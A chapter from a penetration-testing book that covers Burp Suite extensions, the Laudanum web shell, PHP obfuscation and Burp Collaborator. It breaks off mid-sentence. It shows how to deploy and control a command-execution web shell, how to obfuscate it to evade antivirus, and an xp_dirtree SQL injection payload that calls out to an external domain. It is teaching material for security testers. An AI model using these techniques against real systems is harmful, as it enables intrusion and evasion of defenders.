<html><head></head><body><div class="chapter" title="Chapter&#xA0;7.&#xA0;Automated Testing"><div class="titlepage"><div><div><h1 class="title"><a id="ch07"/>Chapter 7. Automated Testing</h1></div></div></div><p>In this chapter, we'll be making our life a bit easier when looking at applications through an attack proxy. Extending functionality through open-source plugins can save precious time on short-term engagements and make sure we don't miss any low-hanging fruit. There are always areas where we can automate something and make the whole penetration testing process a bit more efficient. Luckily, we don't have to write everything from scratch, as the hacking community has a solution for almost any automation problem.</p><p>In previous chapters, we've discussed out-of-band exploitation and here we will go through using Burp's cloud server to automate this type of vulnerability discovery. We will also look at deploying our own instance of the Burp Collaborator server in the cloud or on premises for greater control during an assessment.</p><p>This chapter will expose you to valuable tools and by the end, you should be able to:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Extend the attack proxy to automate tedious tasks</li><li class="listitem" style="list-style-type: disc">Configure Burp to use the public Collaborator instance</li><li class="listitem" style="list-style-type: disc">Deploy our own Collaborator instance</li></ul></div><div class="section" title="Extending Burp"><div class="titlepage"><div><div><h1 class="title"><a id="ch07lvl1sec45"/>Extending Burp</h1></div></div></div><p>Burp Suite <a id="id302" class="indexterm"/>is a fantastic attack proxy and it comes with some great features straight out of the box. As mentioned in previous chapters, Intruder is a flexible brute-forcing tool, Repeater allows us to inspect and fine-tune attacks, and Decoder <a id="id303" class="indexterm"/>streamlines data manipulation. What makes Burp great is the ability to expand functionality through community-developed and community-maintained extensions. PortSwigger, the creator of Burp Suite, also maintains an online directory for extensions called the <span class="strong"><strong>BApp Store</strong></span>. The BApp Store can be accessed via the Extender tab in Burp Suite.</p><div class="mediaobject"><img src="graphics/B09238_07_01.jpg" alt="Extending Burp"/><div class="caption"><p>Figure 7.1: The BApp Store</p></div></div><p>With extensions, we can passively check for outdated libraries, custom build sqlmap command-lines, and quickly check for authentication or authorization vulnerabilities.</p><p>Burp extensions <a id="id304" class="indexterm"/>are typically written in either Java, Python, or Ruby. Since Burp is a Java application, Java extensions will work straight out of the box. For <a id="id305" class="indexterm"/>extensions written in Python or Ruby, we need to point Burp Suite to both <span class="strong"><strong>Jython</strong></span> and <span class="strong"><strong>JRuby</strong></span> interfaces. Python and Ruby are very powerful languages <a id="id306" class="indexterm"/>and some might argue simpler to develop than Java. The BApp Store is mostly extensions written in Java and Jython, but the occasional JRuby requirement will come up.</p><p>
<span class="strong"><strong>Additional Scanner Checks</strong></span>, for example, is an extension written in Python. As the name implies, this extension will augment the Burp Scanner module, with a few extra checks. Before we can install it, however, Burp will prompt us to download Jython. This means that the Extender Python environment was not configured properly yet, which is common among new installations of Burp Suite.</p><p>We can find Additional Scanner Checks in the BApp Store with the <span class="strong"><strong>Install</strong></span> button greyed out. The <span class="strong"><strong>BApp Store</strong></span> page presents us with an option to go and download Jython.</p><div class="mediaobject"><img src="graphics/B09238_07_02.jpg" alt="Extending Burp"/><div class="caption"><p>Figure 7.2: Burp Suite BApp Store page for Additional Scanner Checks</p></div></div><p>The process <a id="id307" class="indexterm"/>to setup Burp for Jython and JRuby is straightforward. Both library implementations come in standalone JAR files, which can be <a id="id308" class="indexterm"/>loaded straight into Burp.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note27"/>Note</h3><p>Jython is available on <a class="ulink" href="http://www.jython.org/downloads.html">http://www.jython.org/downloads.html</a> as a standalone JAR file.</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note28"/>Note</h3><p>JRuby is available on <a class="ulink" href="http://jruby.org/download">http://jruby.org/download</a> as a complete JAR file.</p></div></div><p>In the <span class="strong"><strong>Options</strong></span> tab <a id="id309" class="indexterm"/>of the Extender module, we can specify the freshly downloaded standalone Jython and JRuby JAR files:</p><div class="mediaobject"><img src="graphics/B09238_07_03.jpg" alt="Extending Burp"/><div class="caption"><p>Figure 7.3: Configuring Jython and JRuby environments</p></div></div><p>With the <a id="id310" class="indexterm"/>environment properly configured, the BApp Store should now let us install the Additional Scanner Checks extension. Hitting the <span class="strong"><strong>Refresh list</strong></span> button should pick up the configuration changes and enable the <span class="strong"><strong>Install</strong></span> button:</p><div class="mediaobject"><img src="graphics/B09238_07_04.jpg" alt="Extending Burp"/><div class="caption"><p>Figure 7.4: The Install button is enabled after configuring environment prerequisites</p></div></div><div class="section" title="Authentication and authorization abuse"><div class="titlepage"><div><div><h2 class="title"><a id="ch07lvl2sec29"/>Authentication and authorization abuse</h2></div></div></div><p>One of <a id="id311" class="indexterm"/>the most tedious application security tests is an authentication or authorization check. The basic steps to verify for this type of vulnerability <a id="id312" class="indexterm"/>go something like this:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Authenticate with a known-good account</li><li class="listitem">Capture the session ID</li><li class="listitem">Crawl the application with this session ID</li><li class="listitem">Open a new application session</li><li class="listitem">Authenticate with a separate known-good account</li><li class="listitem">Capture the session ID</li><li class="listitem">Replay the crawl with the new session ID:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Check for vertical or horizontal escalation</li></ul></div></li><li class="listitem">Replay the crawl anonymously, without a session ID:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Check for authentication bypass issues</li></ul></div></li></ol></div><p>To do this manually is a bit of a nightmare and wastes precious time. Thankfully, within the BApp Store, an extension is available to help automate most of this and alert us of any potential issues as early as step 3.</p><p>
<span class="strong"><strong>Autorize</strong></span> will do the heavy lifting for us and we can quickly install it through the Burp Suite interface.</p><div class="mediaobject"><img src="graphics/B09238_07_05.jpg" alt="Authentication and authorization abuse"/><div class="caption"><p>Figure 7.5: Autorize in the BApp Store</p></div></div><p>Simply put, once configured, Autorize will replay each request we make to the application two more times and compare the response to the original request.</p><p>The first <a id="id313" class="indexterm"/>replayed request will contain the session ID of a second known-good account, while the second replayed request will be an anonymous request. The response for the original request should succeed, while the two others <a id="id314" class="indexterm"/>should fail, prompting a separate response, a <code class="literal">403</code> perhaps, or at the very least modifying the body of the response to inform of an authorization error. Autorize will look at the two responses and alert accordingly. If the first replayed request's response matches the original request's response, this would mean both accounts can access the page. If this is an administrative portal and only one of the accounts is an administrator, we've just found a serious authorization problem.</p><p>Autorize can also help us find more serious vulnerabilities with the second replayed request, which removes the <code class="literal">Cookie</code> header, making it an anonymous request. If this request's response matches the original's, an authentication bypass issue is present in the application.</p><div class="section" title="The Autorize flow"><div class="titlepage"><div><div><h3 class="title"><a id="ch07lvl3sec04"/>The Autorize flow</h3></div></div></div><p>A new <a id="id315" class="indexterm"/>request is made through the attack proxy:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Replace the <code class="literal">Cookie</code> header with the other session ID</li><li class="listitem">Replay the request:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Does the response match the original request's? Alert [<span class="strong"><strong>Bypassed!</strong></span>]</li></ul></div></li><li class="listitem">Remove the <code class="literal">Cookie</code> header</li><li class="listitem">Replay the request:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Does the response match the original request's? Alert [<span class="strong"><strong>Bypassed!</strong></span>]</li></ul></div></li></ol></div><p>Once installed, Autorize has to be configured with the proper <code class="literal">Cookie</code> header in order for it to be able to identify issues in the target application.</p><p>First, we need to capture the <code class="literal">Cookie</code> header and the session ID for a user with low privileges. This can be captured by opening a new browsing session and looking at the server response. We will be traversing the application using an administrative account.</p><p>After logging in with the low-privileged account, we can grab the session value from any of the requests to the application:</p><div class="informalexample"><pre class="programlisting">GET /admin/ HTTP/1.1
Host: panel.c2.spider.ml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://panel.c2.spider.ml/
<span class="strong"><strong>Cookie: PHPSESSID=g10ma5vjh4okjvu7apst81jk04</strong></span>
Connection: close
Upgrade-Insecure-Requests: 1</pre></div><p>It's a good idea to grab the whole <code class="literal">Cookie</code> header, as some applications use more than just one cookie to track the user session.</p><p>In the <span class="strong"><strong>Autorize</strong></span> tab, we can enter this value in the <span class="strong"><strong>Configuration</strong></span> section:</p><div class="mediaobject"><img src="graphics/B09238_07_06.jpg" alt="The Autorize flow"/><div class="caption"><p>Figure 7.6: The Autorize tab and Configuration screen</p></div></div><p>It's also <a id="id316" class="indexterm"/>a good idea to modify Autorize's interception filters to only target our in-scope application. The browser can make hundreds of requests to external or third-party applications during a normal crawl session. We don't want to generate three times the traffic for out-of-scope items.</p><p>Autorize will start replaying requests once we click the enable button:</p><div class="mediaobject"><img src="graphics/B09238_07_07.jpg" alt="The Autorize flow"/><div class="caption"><p>Figure 7.7: The Autorize Cookie configuration pane</p></div></div><p>Once we've configured the <code class="literal">Cookie</code> value, we can authenticate to the application with a high-privileged user account and browse the administrative panel. All subsequent requests <a id="id317" class="indexterm"/>will be tested with the low-privilege and anonymous sessions.</p><p>Clicking through the administration panel, Autorize was able to detect a vertical privilege escalation in the <code class="literal">/admin/submit.php</code> page.</p><div class="mediaobject"><img src="graphics/B09238_07_08.jpg" alt="The Autorize flow"/><div class="caption"><p>Figure 7.8: Autorize detected an issue</p></div></div><p>It appears <a id="id318" class="indexterm"/>that while this page is hidden from regular users by a <code class="literal">403</code> error in the admin panel entry point, it is accessible directly and only checks whether the user is logged in, and not whether they have administrative privileges.</p><p>We didn't have to laboriously sift through all requests we've made, change the session ID, and replay them. Autorize did it for us and the end result is an interesting authorization abuse vulnerability.</p></div></div><div class="section" title="The Swiss Army knife"><div class="titlepage"><div><div><h2 class="title"><a id="ch07lvl2sec30"/>The Swiss Army knife</h2></div></div></div><p>One of <a id="id319" class="indexterm"/>the more common tasks you'll find yourself doing is generating custom wordlists based on some target-specific data. This increases your <a id="id320" class="indexterm"/>chance of success but is also kind of tedious. It can be scripted with something like Python, but why not do it in Burp directly?</p><p>Another common task I find myself doing is launching sqlmap attacks against a particular URL within the application. Authenticated SQL injection attacks require that we send the session cookies on the command-line, and for attacks over <code class="literal">POST</code>, this can make building the sqlmap command-line labor-intensive. CO2 is a Burp Suite plugin that provides several enhancements to the attack proxy that integrate well with the rest of the user interface and can create a nice flow between other tools and the Burp.</p><p>I've said this before but as penetration testers and red teamers, we know time is not a luxury we share with the bad guys. Engagements are often time-sensitive and resources are stretched thin. Copying and pasting the <code class="literal">Cookie</code> header from Burp into the terminal to launch <a id="id321" class="indexterm"/>a sqlmap attack doesn't seem like a big deal, but it adds up. What if the target application has several potential SQL injection points? What if you're testing three or four different applications that do not share the same <a id="id322" class="indexterm"/>login credentials? Automation makes life easier and makes us more efficient.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note29"/>Note</h3><p>The CO2 plugin can be downloaded from the BApp Store or from GitHub at <a class="ulink" href="https://github.com/portswigger/co2">https://github.com/portswigger/co2</a>.</p></div></div><p>Installing <a id="id323" class="indexterm"/>CO2 is as easy as any other BApp Store plugin and it adds a few options to the context menu in the Target, Proxy, Scanner, and other modules. Many of the requests made through Burp can be sent directly to a few of the CO2 components. Doing so will fill in most of the required parameters, saving us time and reducing the potential for human error.</p><div class="section" title="sqlmap helper"><div class="titlepage"><div><div><h3 class="title"><a id="ch07lvl3sec05"/>sqlmap helper</h3></div></div></div><p>CO2 provides <a id="id324" class="indexterm"/>a sqlmap wrapper within the Burp user <a id="id325" class="indexterm"/>interface aptly titled <span class="strong"><strong>SQLMapper</strong></span>. If we spot a potential injection point, or perhaps Burp's active scanner notified us of a SQL injection vulnerability, we can send the request straight to CO2's SQLMapper component using the context menu:</p><div class="mediaobject"><img src="graphics/B09238_07_09.jpg" alt="sqlmap helper"/><div class="caption"><p>Figure 7.9: Sending the request to SQLMapper's context menu from CO2</p></div></div><p>In the <a id="id326" class="indexterm"/>CO2 extension tab, the SQLMapper section should be prepopulated with some of the values from the selected URL.</p><p>At this point, we can configure the component to point to the appropriate <code class="literal">sqlmap</code> script and <code class="literal">python</code> binary.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note30"/>Note</h3><p>The Kali distribution comes with a fairly recent version of sqlmap already installed, but the latest and greatest code can be cloned from GitHub at <a class="ulink" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>.</p></div></div><p>The <span class="strong"><strong>Config</strong></span> button will allow us to point CO2 to the right binaries to execute sqlmap from the user interface. The <span class="strong"><strong>Run</strong></span> button will spawn a new terminal with sqlmap and all of the options passed in.</p><div class="mediaobject"><img src="graphics/B09238_07_10.jpg" alt="sqlmap helper"/><div class="caption"><p>Figure 7.10: CO2 SQLMap config popup</p></div></div><p>On Kali, the sqlmap tool is located in the <code class="literal">/usr/bin</code> folder and does not have the <code class="literal">.py</code> extension. If you're working with the bleeding edge from the GitHub repository, you may <a id="id327" class="indexterm"/>want to specify the full path.</p><p>First, we can clone the latest and greatest sqlmap code from GitHub using the <code class="literal">git clone</code> command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools# git clone https://github.com/sqlmapproject/sqlmap</strong></span>
<span class="strong"><strong>Cloning into 'sqlmap'...</strong></span>
<span class="strong"><strong>remote: Counting objects: 60295, done.</strong></span>
<span class="strong"><strong>remote: Compressing objects: 100% (22/22), done.</strong></span>
<span class="strong"><strong>remote: Total 60295 (delta 26), reused 33 (delta 22), pack-reused 60251</strong></span>
<span class="strong"><strong>Receiving objects: 100% (60295/60295), 59.88 MiB | 14.63 MiB/s, done.</strong></span>
<span class="strong"><strong>Resolving deltas: 100% (47012/47012), done.</strong></span>
</pre></div><p>The <code class="literal">sqlmap.py</code> script will be in the cloned <code class="literal">sqlmap</code> directory:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools/sqlmap# ls -lah sqlmap.py</strong></span>
<span class="strong"><strong>-rwxr-xr-x 1 root root 16K Jun 1 15:35 sqlmap.py</strong></span>
<span class="strong"><strong>root@kali:~/tools/sqlmap#</strong></span>
</pre></div><p>sqlmap is a full-featured tool with a ton of options to modify everything from the user agent, to the injection technique, and even the level of aggression of each probe. Typically, we'd have to look through the tool documentation to find that one switch we need, but with CO2's SQLMapper plugin, we can find what we need at a glance.</p><p>As we <a id="id328" class="indexterm"/>select the appropriate options and fill in the blanks, CO2 builds a sqlmap command, which we can either run through the user interface, or copy and run directly in a terminal of our choice.</p><div class="mediaobject"><img src="graphics/B09238_07_11.jpg" alt="sqlmap helper"/><div class="caption"><p>Figure 7.11: CO2's SQLMapper plugin</p></div></div><p>The <span class="strong"><strong>Run</strong></span> button will launch a new terminal window and start sqlmap with the selected options:</p><div class="mediaobject"><img src="graphics/B09238_07_12.jpg" alt="sqlmap helper"/><div class="caption"><p>Figure 7.12: sqlmap running with the selected options</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note31"/>Note</h3><p>sqlmap will save the session of each attack in a folder under the home directory: <code class="literal">~/.sqlmap/output/[target]</code>
</p></div></div><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/.sqlmap/output/c2.spider.ml</strong></span>
<span class="strong"><strong># tree</strong></span>
<span class="strong"><strong>.</strong></span>
<span class="strong"><strong>├── log</strong></span>
<span class="strong"><strong>├── session.sqlite</strong></span>
<span class="strong"><strong>└── target.txt</strong></span>

<span class="strong"><strong>0 directories, 3 files</strong></span>
<span class="strong"><strong>root@kali:~/.sqlmap/output</strong></span>
<span class="strong"><strong>/c2.spider.ml#</strong></span>
</pre></div></div><div class="section" title="Web shells"><div class="titlepage"><div><div><h3 class="title"><a id="ch07lvl3sec06"/>Web shells</h3></div></div></div><p>The CO2 Swiss <a id="id329" class="indexterm"/>Army knife also provides an easy way to generate <a id="id330" class="indexterm"/>web shells for a number of server-side languages. If we manage to upload a shell to one of these boxes, we need a simple, somewhat secure shell to escalate privileges and ultimately reach our goal.</p><p>Cue <span class="strong"><strong>Laudanum</strong></span>, a collection of basic web shells for a variety of backends, supporting ASP, JSP, ASPX, Java, and PHP. Laudanum also allows us to specify a random connection token and restrict access by IP. These shells do allow for remote code execution and it makes <a id="id331" class="indexterm"/>sense to protect them until a more robust reverse shell can be established.</p><p>In the <a id="id332" class="indexterm"/>Laudanum component of CO2, we can specify the type of shell we'd like to setup, the IPs that will be allowed to connect, and a randomized token used for a bit more protection.</p><p>The process to generate a shell is simple. First, we open the <span class="strong"><strong>Laudanum</strong></span> tab in CO2 and:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Select the type of shell:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>PHP Shell</strong></span> in this scenario</li></ul></div></li><li class="listitem">A comma-separated list of IPs, without spaces:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><code class="literal">127.0.0.1,192.168.1.123</code></li></ul></div></li><li class="listitem">Click the <span class="strong"><strong>Gen New Token</strong></span> button for a random token value:</li></ol></div><div class="mediaobject"><img src="graphics/B09238_07_13.jpg" alt="Web shells"/><div class="caption"><p>Figure 7.13: The Laudanum CO2 plugin</p></div></div><p>To save the file somewhere on disk, click the <span class="strong"><strong>Generate File</strong></span> button. The contents of the generated shell will look like the following:</p><div class="mediaobject"><img src="graphics/B09238_07_14.jpg" alt="Web shells"/><div class="caption"><p>Figure 7.14: The Laudanum shell source code</p></div></div><p>Once uploaded to the target, to access the shell we have to make sure our external IP matches <a id="id333" class="indexterm"/>one of the whitelisted IPs and we also have to specify the randomly generated token for every request.</p><p>We can <a id="id334" class="indexterm"/>pass this token using the <code class="literal">laudtoken</code> URL parameter and the command to execute via <code class="literal">laudcmd</code>. Values for these parameters can also be passed via <code class="literal">POST</code>.</p><p>It should be noted that even with the correct token in the URL, a request from an unknown IP will be rejected with a <code class="literal">404</code> response.</p><p>Here, we test a simple web request from a Windows machine using PowerShell's <code class="literal">Invoke-WebRequest</code> commandlet. Since the request is not coming from a known IP (one we've specified during the creation of the shell), the request is denied.</p><div class="mediaobject"><img src="graphics/B09238_07_15.jpg" alt="Web shells"/><div class="caption"><p>Figure 7.15: Rejected shell request from unknown IP</p></div></div><p>Our client <a id="id335" class="indexterm"/>will appreciate the extra security checks; after all, we are here to find vulnerabilities and not introduce new ones. It should go without saying, but this is not foolproof; this file should be purged during cleanup just like any other artifact we drop <a id="id336" class="indexterm"/>on the target.</p><p>With the proper external IP and the token in hand, we can gain control of the shell using Burp Suite's Repeater module.</p><p>To issue a request, we can fill in the minimum <code class="literal">GET</code> request headers, as shown in the following screenshot. What we need to configure is the <span class="strong"><strong>Target</strong></span>, in the top-right corner of the <span class="strong"><strong>Repeater</strong></span> tab; the URL requested via <code class="literal">GET</code>; and the values for the <code class="literal">laudtoken</code> and <code class="literal">laudcmd</code>.</p><div class="mediaobject"><img src="graphics/B09238_07_16.jpg" alt="Web shells"/><div class="caption"><p>Figure 7.16: Successfully accessing the protected Laudanum shell</p></div></div></div></div></div></div>
<div class="section" title="Obfuscating code"><div class="titlepage"><div><div><h1 class="title"><a id="ch07lvl1sec46"/>Obfuscating code</h1></div></div></div><p>The Laudanum <a id="id337" class="indexterm"/>shell generated by CO2 in the previous section worked just fine, but if a defender looks a little too closely at the source code, it will definitely raise some red flags. Ideally, we want to keep the file size as small as possible and try to make the code more difficult to analyze. The comments, the properly indented code, and descriptive variable names make figuring out what <code class="literal">ads.php</code> actually does a breeze.</p><p>Let's make analysis a bit more complicated. Code obfuscators are commonly used in digital rights management software, anti-piracy modules, and of course, malware. While no code obfuscator will stop an experienced reverse engineer, it certainly does slow things down; perhaps long enough for us to move on to another server or application, but at least long enough to evade antivirus signatures. Ideally, we remove the comments, rename the variables, and try to hide the shell's actual functionality, but it's not a good idea to do this manually. Human error can introduce code issues and obfuscation can cause more problems than it solves.</p><p>Obfuscators will transform the source code of an application (or in our case, web shell) into a compact mess of code, stripped of comments, with random names for variables, making it difficult to analyze. The beauty of this is that even if the code is mangled and hard to comprehend by humans, the parser or compiler will not care that much, as long as it is syntactically correct. The application should have no issue running properly obfuscated code.</p><p>There <a id="id338" class="indexterm"/>are source code obfuscators for almost every programming language out there. To obfuscate PHP, we can use naneau's fantastic application, PHP Obfuscator, an easy-to-use command-line utility.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note32"/>Note</h3><p>PHP Obfuscator can be cloned from <a class="ulink" href="https://github.com/naneau/php-obfuscator">https://github.com/naneau/php-obfuscator</a>.</p></div></div><p>We will store the application in <code class="literal">~/tools/phpobfs</code> and clone it from GitHub with <code class="literal">git clone</code>:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools# git clone https://github.com/naneau/php-obfuscator phpobfs</strong></span>
<span class="strong"><strong>Cloning into 'phpobfs'...</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>root@kali:~/tools#</strong></span>
</pre></div><p>PHP Obfuscator requires composer, which can be quickly installed on Kali or similar distributions using <code class="literal">apt-get install</code>:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools/# apt-get install composer</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>root@kali:~/tools/#</strong></span>
</pre></div><p>In the newly cloned <code class="literal">phpobfs</code> directory, we can issue a <code class="literal">composer install</code> command to generate an <code class="literal">obfuscate</code> tool in the <code class="literal">bin</code> folder:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools/phpobfs# composer install</strong></span>
<span class="strong"><strong>Do not run Composer as root/super user! See https://getcomposer.org/root for details</strong></span>
<span class="strong"><strong>Loading composer repositories with package information</strong></span>
<span class="strong"><strong>Updating dependencies (including require-dev)</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>Writing lock file</strong></span>
<span class="strong"><strong>Generating autoload files</strong></span>
<span class="strong"><strong>root@kali:~/tools/phpobfs#</strong></span>
</pre></div><p>If everything ran successfully, we should have an executable script in <code class="literal">bin</code> called <code class="literal">obfuscate</code>, which we can use to mangle our Laudanum shell.</p><p>We can call the <code class="literal">obfuscate</code> tool with the <code class="literal">obfuscate</code> parameter, and pass in the file to mangle, as well as the output directory:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools/phpobfs# bin/obfuscate obfuscate ~/tools/shells/ads.php ~/tools/shells/out/</strong></span>
<span class="strong"><strong>Copying input directory /root/tools/shells/ads.php to /root/tools/shells/out/</strong></span>
<span class="strong"><strong>Obfuscating ads.php</strong></span>
<span class="strong"><strong>root@kali:~/tools/phpobfs#</strong></span>
</pre></div><p>If we <a id="id339" class="indexterm"/>inspect the newly obfuscated <code class="literal">ads.php</code> file, we now see this blob of code:</p><div class="mediaobject"><img src="graphics/B09238_07_17.jpg" alt="Obfuscating code"/><div class="caption"><p>Figure 7.17: Obfuscated Laudanum shell</p></div></div><p>Some strings are still visible and we can see the IPs and token values are still intact. The variables are changed to non-descriptive random words, the comments are gone, and the result is really compact. The difference in size between the two shells is also significant:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/tools/shells# ls -lah ads.php out/ads.php</strong></span>
<span class="strong"><strong>-rw-r--r-- 1 root root 5.2K 14:14 </strong></span>
<span class="strong"><strong>ads.php</strong></span>
<span class="strong"><strong>-rw-r--r-- 1 root root 1.9K 14:14 out/ads.php</strong></span>
<span class="strong"><strong>root@kali:~/tools/shells#</strong></span>
</pre></div><p>It's not <a id="id340" class="indexterm"/>foolproof, but it should let us fly under the radar a bit longer. PHP Obfuscate should work on all PHP code, including shells you may choose to write yourself.</p></div>
<div class="section" title="Burp Collaborator"><div class="titlepage"><div><div><h1 class="title"><a id="ch07lvl1sec47"/>Burp Collaborator</h1></div></div></div><p>In the <a id="id341" class="indexterm"/>previous chapter, we looked at finding obscure vulnerabilities in applications that may not be obvious to attackers. If the application does not flinch when we feed it unexpected input, it could be that it is not vulnerable and the code properly validates input, but it could also mean that a vulnerability exists but it's hidden. To identify these types of vulnerabilities, we passed in a payload that forced the application to connect back to our C2 server.</p><p>This is a very useful technique, but the process was manual. We passed in custom payloads and waited for a ping from the server to confirm the existence of a vulnerability. Most application assessments are time-limited and manually checking each input on a large attack surface is not realistic. We have to automate this process.</p><p>Luckily, the professional version of Burp Suite allows us to use a Collaborator server infrastructure to help automate finding vulnerabilities out-of-band.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note33"/>Note</h3><p>The free version does not support Collaborator; however, <a class="link" href="ch06.html" title="Chapter 6. Out-of-Band Exploitation">Chapter 6</a>, <span class="emphasis"><em>Out-of-Band Exploitation</em></span>, described the process and how to build a C2 infrastructure that can be used for the same purpose.</p></div></div><p>The Collaborator server is similar to the C2 server we set up in <a class="link" href="ch06.html" title="Chapter 6. Out-of-Band Exploitation">Chapter 6</a>, <span class="emphasis"><em>Out-of-Band Exploitation</em></span>, but has a few more bells and whistles. Notably, it integrates with Burp's Scanner module to check for these hard-to-find vulnerabilities automatically. It's also less prone to false positives than the more manual approach.</p><p>The Collaborator setting can be found under the <span class="strong"><strong>Project options</strong></span> tab and can be either disabled or enabled to use the default server or a private instance.</p><p>Collaborator, at a high-level, works like this:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Burp scanner generates a payload to detect SQL injection:<div class="informalexample"><pre class="programlisting">';declare @q varchar(99);set <span class="strong"><strong>@q='\\bXkgY3JlZGl0IGNhcmQgbnVtYmVyIGlz.burpcollaborator.net\test'</strong></span>; exec master.dbo.xp_dirtree <span class="strong"><strong>@q</strong></span>;--</pre></div></li><li class="listitem">The application asynchronously executes the SQL query</li><li class="listitem">The SQL injection is successful</li><li class="listitem">The SQL server attempts to list the SMB share on the randomly generated <code class="literal">burpcollaborator.net</code> domain</li><li class="listitem">A DNS lookup is performed:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Collaborator server logs this DNS request attempt</li></ul></div></li><li class="listitem">An SMB connection is made and dummy data is returned:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Collaborator server logs this SMB connection attempt as well</li></ul></div></li><li class="listitem">The Burp client checks in with the Collaborator server</li><li class="listitem">The Collaborator server reports two issues:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">An out-of-band DNS request was made</li><li class="listitem" style="list-style-type: disc">An out-of-band service interaction for SMB was observed</li></ul></div></li></ol></div><p>The beauty <a id="id342" class="indexterm"/>of Collaborator is that the randomly generated unique domain can actually be linked to a specific request made by the scanner. This tells us exactly which URL and which parameter is vulnerable to SQL injection.</p><div class="section" title="Public Collaborator server"><div class="titlepage"><div><div><h2 class="title"><a id="ch07lvl2sec31"/>Public Collaborator server</h2></div></div></div><p>The default <a id="id343" class="indexterm"/>Collaborator server is an instance operated by PortSwigger, the Burp Suite developers. It resides on <a class="ulink" href="http://burpcollaborator.net">burpcollaborator.net</a> and support is built into Burp.</p><p>As you'd expect, the default Collaborator instance is accessible by everyone with a copy of the <a id="id344" class="indexterm"/>professional version of Burp and resources are shared among all its users. From a privacy perspective, users cannot see each other's Collaborator requests. Each payload is unique and crafted by Burp Suite for every request. The communication is encrypted and a unique, per-user secret is required to retrieve any data from the server.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note34"/>Note</h3><p>Burp Collaborator takes several steps to ensure the data is safe. You can read more about the whole process on <a class="ulink" href="https://portswigger.net/burp/help/collaborator">https://portswigger.net/burp/help/collaborator</a>.</p></div></div><p>To enable <a id="id345" class="indexterm"/>Collaborator, we can navigate to the <span class="strong"><strong>Misc</strong></span> tab under <span class="strong"><strong>Project options</strong></span> and select the <span class="strong"><strong>Use the default Collaborator server</strong></span> radial button, as shown:</p><div class="mediaobject"><img src="graphics/B09238_07_18.jpg" alt="Public Collaborator server"/><div class="caption"><p>Figure 7.18: Configuring the Burp Collaborator server</p></div></div><p>To use the public server, no further information is needed. We can issue a health check to see whether the Burp Suite client can reach it before we begin the test, by clicking the <span class="strong"><strong>Run health check…</strong></span> button on the configuration page. A new window will popup and display the ongoing health check, with the status for each check, as shown:</p><div class="mediaobject"><img src="graphics/B09238_07_19.jpg" alt="Public Collaborator server"/><div class="caption"><p>Figure 7.19: Burp Collaborator health check</p></div></div><p>SMTP connection issues are common if you're behind an ISP that still blocks outgoing connections <a id="id346" class="indexterm"/>on ports used by spam bots. Chances are that your target is not on a domestic ISP and these types of restrictions are not in place, at least not at the ISP level. Egress filtering can hinder out-of-band discovery, which is where a private instance on the LAN comes in handy. We discuss deploying a private Collaborator server later in the chapter.</p><div class="section" title="Service interaction"><div class="titlepage"><div><div><h3 class="title"><a id="ch07lvl3sec07"/>Service interaction</h3></div></div></div><p>To see <a id="id347" class="indexterm"/>Collaborator in action, we can point the Burp Active Scanner to a vulnerable application and wait for it to execute one of the payloads generated, and perform a connect back to the public Collaborator server <a class="ulink" href="http://burpcollaborator.net">burpcollaborator.net</a>.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note35"/>Note</h3><p>The Damn Vulnerable Web Application is a good testing bed for Collaborator: <a class="ulink" href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a>.</p></div></div><div class="mediaobject"><img src="graphics/B09238_07_20.jpg" alt="Service interaction"/><div class="caption"><p>Figure 7.20: Out-of-band vulnerabilities detected by Collaborator</p></div></div><p>The Burp <a id="id348" class="indexterm"/>Suite client will check in periodically with the Collaborator server to ask about any recorded connections. In the preceding case, we can see that the application, vulnerable to command injection, was tricked into connecting to the Collaborator cloud instance by performing a DNS lookup on a unique domain.</p><p>The Collaborator server intercepted this DNS request from the vulnerable application, 